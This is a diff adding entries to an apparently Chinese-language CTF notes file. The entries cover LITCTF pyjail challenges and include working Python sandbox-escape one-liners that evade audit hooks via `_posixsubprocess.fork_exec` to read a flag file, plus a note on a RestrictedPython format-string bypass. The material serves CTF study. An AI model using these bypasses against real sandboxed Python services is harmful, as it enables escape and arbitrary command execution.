@@ -489,6 +489,13 @@ def create_zip_payload() -> bytes:
 temp=f"pwn={create_zip_payload()!r}"
 print(base64.b64encode(temp.encode()))
 ```
+- [obligatory pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/obligatory%20pyjail)
+  - 禁止除exec或compile外的[audit events](https://docs.python.org/3/library/audit_events.html)。`__import__('os')`和`__loader__.load_module`不会触发import audit event；`_posixsubprocess.fork_exec`可以在最底层执行exec，不会被audit event捕捉到
+  - `__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)`
+  - `__import__("_posixsubprocess").fork_exec(['cat', 'flag.txt'], (b'/bin/cat',), True, (7,), None, None, -1, -1, __import__("os").pipe()[0], 5, -1, -1, __import__("os").pipe()[0], 7, True, False, None, None, None, -1, None)+print(__import__("os").read(4, 1000).decode())`
+  - `[lm:=().__class__.__base__.__subclasses__()[104].load_module,p:=__import__("os").pipe,_ps:=lm("_posixsubprocess"),_ps.fork_exec([b"/bin/cat", b"flag.txt"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(p()), False, False, None, None, None, -1, None)]`
+- [wow it's another pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail)
+  - 有关RestrictedPython的漏洞。可以利用format访问用下划线开头的属性（这类属性正常情况下是被保护的，无法直接访问）
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
@@ -1269,3 +1276,4 @@ int main() {
   //Output: "                                          a"
   ```
   利用这个format可以实现pie无leak情况下修改返回地址（但是成功率1/3）
+- 一个解释得更明白的补充wp： https://ywhkkx.github.io/2023/09/06/LITCTF2023/#stiller-printf 。但是好像打错字了，“对其”应该是”对齐“
